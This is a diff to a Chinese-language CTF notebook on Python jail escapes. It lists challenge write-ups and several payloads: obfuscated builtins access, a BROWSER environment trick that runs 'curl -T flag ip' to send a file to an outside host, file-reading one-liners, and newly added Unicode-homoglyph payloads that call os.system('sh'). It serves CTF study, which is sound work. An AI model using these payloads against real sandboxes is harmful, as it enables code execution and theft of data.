@@ -566,7 +566,7 @@ gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai
 - [Get and set](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Get%20and%20set):能无限次对某个空object使用`pydash.set_`和`pydash.get`，参数无限制，实现rce。总体思路：Get `__builtins__` from `__reduce_ex__(3)[0].__builtins__`, and you can call arbitrary functions using magic methods like `__getattr__` or `__getitem__`
 - [You shall not call](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call),[wp](https://gist.github.com/lebr0nli/eec8f5addd77064f1fa0e8b22b6a54f5)；[You shall not call Revenge](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call-revenge),[wp](https://gist.github.com/lebr0nli/53216005991d012470c0bde0f38952b1):两个都是有关pickle的的pyjail，用有限的pickle code构造pickle object。前者只需读文件，revenge需要得到rce
 - [My Third Calculator](https://ireland.re/posts/TheFewChosen_2023/#my-third-calculator):`__import__('antigravity',setattr(__import__('os'),'environ',{'BROWSER':'/bin/sh -c "curl -T flag ip;exit" #%s'}))`.antigravity是python里一个彩蛋模块，导入它会打开[xkcd](https://xkcd.com/353/)。通过将环境变量browser改为shell命令，就能在导入时执行shell命令而不是打开网页
-- `list(open("flag.txt"))`/`str([*open('flag.txt')])`/`open('flag.txt').__next__()`:没有read函数的情况下读取文件。需要在`print(eval(input()))`或者python console的情况下使用。单纯eval是没有输出的
+- `list(open("flag.txt"))`/`str([*open('flag.txt')])`/`open('flag.txt').__next__()`:没有read函数的情况下读取文件。需要在`print(eval(input()))`或者python console的情况下使用。单纯eval是没有输出的。加个print就有输出了：`print(*open("flag.txt"))`
 - [PyPlugins](https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#pyplugins): python是能接受zip file当作input的(参考zipapp)，里面的运作原理和一般zip解压缩很像，就是找zip的end of central directory之类的。另一方面CPython还有个pyc档案包含了一些header和code object，而code object上又会有co_consts的存在。所以如果你有个Python里面有个很长的byte literal包含了一个zip，它编译成pyc之后会直接在里面展开，而此时去执行它的时候CPython反而是会因为那个zip signature而把它误认成zip来执行。可利用此绕过非常严格的opcodes限制。`runpy.run_path(py_compile.compile(path))`
 ```py
 #生成path指向的文件内容
@@ -701,6 +701,7 @@ print(base64.b64encode(temp.encode()))
   - obligatory pyjail+PyMagic(这两题我竟然都记过)。这题倒没什么绕过audit hook的技巧，但是pyjail技巧不少
   - wp作者的python相关cheatsheet： https://github.com/salvatore-abello/python-ctf-cheatsheet
   - 官方wp： https://github.com/L3AK-TEAM/L3akCTF-2024-public/tree/main/misc/PySysMagic
+- 一些只用了较少python printable字符的RCE payload： `𝕤𝕪𝕤.𝕞𝕠𝕕𝕦𝕝𝕖𝕤['os'].𝕤𝕪𝕤𝕥𝕖𝕞('sh')`，`[*𝔰𝔶𝔰.𝔪𝔬𝔡𝔲𝔩𝔢𝔰.𝔳𝔞𝔩𝔲𝔢𝔰()][29].𝔰𝔶𝔰𝔱𝔢𝔪(𝔰𝔶𝔰.𝔢𝔵𝔢𝔠𝔲𝔱𝔞𝔟𝔩𝔢)`
 40. pwntools可以连接启用ssl/tls的远程服务器，只需给remote添加一个参数`ssl=True`。如：
 ```python
 p=remote("",443,ssl=True)
